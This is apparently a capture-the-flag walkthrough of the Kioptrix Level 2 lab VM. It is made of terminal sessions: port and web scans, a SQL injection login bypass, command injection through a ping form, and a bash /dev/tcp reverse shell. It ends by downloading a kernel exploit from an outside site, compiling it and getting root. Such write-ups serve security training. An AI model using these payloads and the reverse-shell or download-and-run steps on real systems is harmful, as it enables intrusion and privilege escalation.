@@ -1,0 +1,231 @@
+root@Blue3:~# nmap -sC -sS -sV -A -T4 -p- 192.168.1.10
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 00:27 +07
+Nmap scan report for 192.168.1.10
+Host is up (0.013s latency).
+Not shown: 65528 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
+| ssh-hostkey:
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind    2 (RPC #100000)
+443/tcp  open  ssl/https?
+|_ssl-date: 2020-08-04T14:13:35+00:00; -1d03h15m02s from scanner time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+631/tcp  open  ipp        CUPS 1.1
+| http-methods:
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+636/tcp  open  status     1 (RPC #100024)
+3306/tcp open  mysql      MySQL (unauthorized)
+MAC Address: 00:0C:29:54:6A:5B (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.30
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: -1d03h15m02s
+
+TRACEROUTE
+HOP RTT      ADDRESS
+1   12.96 ms 192.168.1.10
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 181.00 seconds
+
+# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #
+
+root@Blue3:~# nikto -p 80 -h 192.168.1.10
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.10
++ Target Hostname:    192.168.1.10
++ Target Port:        80
++ Start Time:         2020-08-06 00:34:34 (GMT7)
+---------------------------------------------------------------------------
++ Server: Apache/2.0.52 (CentOS)
++ Retrieved x-powered-by header: PHP/4.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ Uncommon header 'tcn' found, with contents: choice
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sun Mar 30 01:41:04 1980
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8725 requests: 1 error(s) and 17 item(s) reported on remote host
++ End Time:           2020-08-06 00:36:05 (GMT7) (91 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #
+
+Hitting http://192.168.1.10 shows us a login form, possibly vulnerable to SQL injection. I tried the vanilla admin' or 1=1 # and it worked!
+
+Why did it work? Possibly because the query is in this form:
+SELECT * from users where username="$_REQUEST["username"]" and password="$_REQUEST["password"]"
+
+After submitting admin" or 1=1 #, it’s evaluated to:
+SELECT * from users where username="admin" or 1=1 # //ignored => which logs us in as admin.
+
+# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #
+
+Input: localhost
+
+PING localhost.localdomain (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=0 ttl=64 time=0.009 ms
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=1 ttl=64 time=0.015 ms
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=2 ttl=64 time=0.035 ms
+
+--- localhost.localdomain ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2010ms
+rtt min/avg/max/mdev = 0.009/0.019/0.035/0.012 ms, pipe 2
+
+# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #
+
+Input: localhost;whoami
+
+PING localhost.localdomain (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=0 ttl=64 time=0.008 ms
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=1 ttl=64 time=0.013 ms
+64 bytes from localhost.localdomain (127.0.0.1): icmp_seq=2 ttl=64 time=0.016 ms
+
+--- localhost.localdomain ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.008/0.012/0.016/0.004 ms, pipe 2
+apache
+
+# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #
+
+REVERSE SHELL:
+root@Blue3:~# nc -lvnp 443
+listening on [any] 443 ...
+
+On Victim 192.168.1.10, Input: 127.0.0.1;bash -i >& /dev/tcp/192.168.1.3/443 0>&1
+Note:
+>& is the syntax used by csh and tcsh to redirect both stdout and stderr. That's probably why bash accepts it.
+0 - stdin
+1 - stdout
+2 - stderr
+=> 0>&1 = Redirect the "file descriptor" from stdin(0) to stdout(1)
+*bash -i >& /dev/tcp/192.168.1.3/443 0>&1   <=>   Create an interactive shell, connect to attacker ip/port and redirect all input to output
+
+RESULT:
+root@Blue3:~# nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.1.3] from (UNKNOWN) [192.168.1.10] 32772
+bash: no job control in this shell
+bash-3.00$
+
+# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #
+
+bash-3.00$ whoami
+apache
+bash-3.00$ ls -ltra
+total 24
+drwxr-xr-x  8 root root 4096 Oct  7  2009 ..
+-rwxr-Sr-t  1 root root  199 Oct  8  2009 pingit.php
+drwxr-xr-x  2 root root 4096 Oct  8  2009 .
+-rwxr-Sr-t  1 root root 1733 Feb  9  2012 index.php
+bash-3.00$ cd /etc
+bash-3.00$ pwd
+/etc
+bash-3.00$ cat os-release
+cat: os-release: No such file or directory
+bash-3.00$ uname -a
+Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+bash-3.00$ uname -mrs
+Linux 2.6.9-55.EL i686
+bash-3.00$ cat /etc/redhat-release
+CentOS release 4.5 (Final)
+
+# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #
+
+root@Blue3:~# searchsploit CentOS 4.5
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                      |  Path
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privil | linux/local/9479.c
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privile | linux_x86/local/9542.c
+Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privilege Escalation                                       | linux/local/35370.c
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+=> https://www.exploit-db.com/exploits/9542
+Download link: https://www.exploit-db.com/download/9542
+Alternative Download: https://eblue3.com/exploit/9542
+
+# ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- #
+
+bash-3.00$ cd /tmp
+bash-3.00$ pwd
+/tmp
+bash-3.00$ wget --no-check-certificate https://eblue3.com/exploit/9542
+--12:05:23--  https://eblue3.com/exploit/9542
+           => `9542'
+Resolving eblue3.com... 171.241.54.40
+Connecting to eblue3.com|171.241.54.40|:443... connected.
+WARNING: Certificate verification error for eblue3.com: unable to get local issuer certificate
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+      0K ..                                                      252.06 MB/s
+  12:05:24 (252.06 MB/s) - `9542' saved [2643]
+  bash-3.00$ ls -ltra
+total 24
+drwxrwxrwt   2 root   root   4096 Aug  5 10:51 .ICE-unix
+drwxr-xr-x  23 root   root   4096 Aug  5 10:51 ..
+drwxrwxrwt   2 root   root   4096 Aug  5 10:52 .font-unix
+-rw-r--r--   1 apache apache 2643 Aug  5 12:05 9542
+drwxr-xrwx   4 root   root   4096 Aug  5 12:05 .
+bash-3.00$ mv 9542 9542.c
+bash-3.00$ gcc 9542.c
+9542.c:109:28: warning: no newline at end of file
+bash-3.00$ ls
+9542.c
+a.out
+bash-3.00$ ./a.out
+sh: no job control in this shell
+sh-3.00# whoami
+root
+sh-3.00#
